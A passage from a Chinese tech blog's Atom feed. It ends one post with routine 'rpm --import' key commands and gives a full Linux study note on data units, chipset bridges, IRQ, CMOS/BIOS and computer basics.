<h2 id="签名导入"><a href="#签名导入" class="headerlink" title="签名导入"></a>签名导入</h2><figure class="highlight swift"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rpm --<span class="keyword">import</span> 签名文件</div><div class="line">rpm --<span class="keyword">import</span> RPM-GPG-KEY</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;对于一个rpm包来说，都是有”-“和”.”构成的，基本上有以下几部分组成：&lt;code&gt;包名&lt;/code&gt;、&lt;code&gt;版本信息&lt;/code&gt;、&lt;code&gt;发布版本号&lt;/code&gt;、&lt;code&gt;运行平台&lt;/code&gt;，当出现noarch, 代表的是软件可以平台兼容。&lt;br&gt;
    
    </summary>
    
    
      <category term="Skill" scheme="http://www.sanstylemc.cn/tags/Skill/"/>
    
  </entry>
  
  <entry>
    <title>Linux笔记一</title>
    <link href="http://www.sanstylemc.cn/2018/07/19/Linux%E7%AC%94%E8%AE%B0%E4%B8%80/"/>
    <id>http://www.sanstylemc.cn/2018/07/19/Linux笔记一/</id>
    <published>2018-07-19T02:41:30.000Z</published>
    <updated>2018-07-19T02:43:03.619Z</updated>
    
    <content type="html"><![CDATA[<p>鸟哥私房菜学习一。<br><a id="more"></a></p>
<h2 id="计量单位"><a href="#计量单位" class="headerlink" title="计量单位"></a>计量单位</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;电脑对数据的判断主要依据有没有通电来记录信息，所以理论上对于每一个记录单位而言，它只认识0与1而已。0/1这个二进制的单位我们成为bit。但bit太小，所以在储存数据时每份简单的数据都会使用到8个bit的大小来记录，因此定义出Byte这个单位，关系为<code>1 Byte = 8 bits</code>。</p>
<table>
<thead>
<tr>
<th style="text-align:center">进位制</th>
<th style="text-align:center">Kilo</th>
<th style="text-align:center">Mega</th>
<th style="text-align:center">Giga</th>
<th style="text-align:center">Tera</th>
<th style="text-align:center">Peta</th>
<th style="text-align:center">Exa</th>
<th style="text-align:center">Zetta</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">二进制</td>
<td style="text-align:center">1024</td>
<td style="text-align:center">1024K</td>
<td style="text-align:center">1024M</td>
<td style="text-align:center">1024G</td>
<td style="text-align:center">1024T</td>
<td style="text-align:center">1024P</td>
<td style="text-align:center">1024E</td>
</tr>
<tr>
<td style="text-align:center">十进制</td>
<td style="text-align:center">1000</td>
<td style="text-align:center">1000K</td>
<td style="text-align:center">1000M</td>
<td style="text-align:center">1000G</td>
<td style="text-align:center">1000T</td>
<td style="text-align:center">1000P</td>
<td style="text-align:center">1000E</td>
</tr>
</tbody>
</table>
<p><code>例题</code>: 假设有500GB硬盘一个，但是格式化完毕后却只剩下460GB左右的容量，这是什么原因？</p>
<blockquote>
<p>答: 因为一般硬盘制造商会使用十进制的单位，所以500GByte代表为<code>500*1000*1000*1000Byte</code>之意。转成文件的容量单位时使用二进制(1024为底)，所以就成为460GB左右的容量了。</p>
</blockquote>
<h2 id="电脑架构与设备元件"><a href="#电脑架构与设备元件" class="headerlink" title="电脑架构与设备元件"></a>电脑架构与设备元件</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;早期的芯片组通常分为两个桥接器来控制各元件的沟通，分别是：<br>(1) 北桥：负责连接速度较快的CPU、内存与显卡接口等元件；<br>(2) 南桥：负责连接速度较慢的设备接口，包括硬盘、USB、网卡等。<br>目前的主流架构中，大多将北桥内存控制器整合到CPU封装当中了。</p>
<h2 id="主板"><a href="#主板" class="headerlink" title="主板"></a>主板</h2><h3 id="设备I-O位址与IRQ中断信道"><a href="#设备I-O位址与IRQ中断信道" class="headerlink" title="设备I/O位址与IRQ中断信道"></a>设备I/O位址与IRQ中断信道</h3><p>不能有两个设备使用同一个I/O位址，否则系统就会不晓得该如何运行这两个设备了。<br>IRQ中断信道。</p>
<h3 id="CMOS和BIOS"><a href="#CMOS和BIOS" class="headerlink" title="CMOS和BIOS"></a>CMOS和BIOS</h3><p><code>CMOS</code>：主要的功能为记录主板上面的重要参数，包括系统时间、CPU电压与频率、各项设备的I/O位址与IRQ等，由于这些数据的记录要花费电力，因此主板上面才有电池。<br><code>BIOS</code>：为写入到主板上某一块flash或EEPROM的程序，他可以在开机的时候执行，以载入CMOS当中的参数，并尝试调用储存设备中的开机程序，进一步进入操作系统当中。BIOS也可以修改CMOS中的数据。</p>
<h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">计算机的定义为: 接受使用者输入指令与数据，经由中央处理器的数学与逻辑单元运算处理后，以产生储存成有用的信息。</div><div class="line"><span class="string">`电脑的五大单元包括`</span>：输入单元、输出单元、控制单元、算术逻辑单元、存储单元五大部分。其中<span class="meta">CPU</span>占有控制、算术逻辑单元，存储单元又包含内存与辅助内存。</div><div class="line">数据会流进/流出内存是<span class="meta">CPU</span>所发布的控制命令，而<span class="meta">CPU</span>实际要处理的数据则完全来自于内存。</div><div class="line"><span class="string">`CPU设计理念主要分为`</span>：精简指令集(RISC)与复杂指令集(CISC)系统。</div><div class="line"><span class="string">`关于CPU的频率部分`</span>：外频指的是<span class="meta">CPU</span>与外部元件进行数据传输时的速度，倍频则是<span class="meta">CPU</span>内部用来加速工作性能的一个倍数，两者相乘才是<span class="meta">CPU</span>的频率速度。</div><div class="line">新的<span class="meta">CPU</span>设计中，已经将北桥的内存控制芯片整合到<span class="meta">CPU</span>中，而<span class="meta">CPU</span>与内存、显卡沟通的总线通常称为系统总线。南桥就是所谓的输入输出(I/O)总线，主要在联系硬盘、USB、网卡等周边设备。</div><div class="line"><span class="meta">CPU</span>每次能够处理的数据量称为字组大小，字组大小依据<span class="meta">CPU</span>的设计而有<span class="number">32</span>位与<span class="number">64</span>位。我们现在所称的电脑是<span class="number">32</span>或<span class="number">64</span>位主要是依据这个<span class="meta">CPU</span>解析的字组大小而来的。</div><div class="line">个人电脑的内存主要元件为动态随机存取内存，至于<span class="meta">CPU</span>内部的第二层高速缓存则使用静态随机存取内存。</div><div class="line">BIOS是一套程序，这套程序是写死到主板上面的一个内存芯片中，这个内存芯片在没有通电时也能够将数据记录下来，那就是只读存储器(ROM)。</div><div class="line">操作系统(OS)其实也是一组程序，这组程序的重点在于管理电脑的所有活动以及驱动系统中的所有硬件。</div></pre></td></tr></table></figure>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;鸟哥私房菜学习一。&lt;br&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="http://www.sanstylemc.cn/tags/Linux/"/>
    
  </entry>
  
</feed>
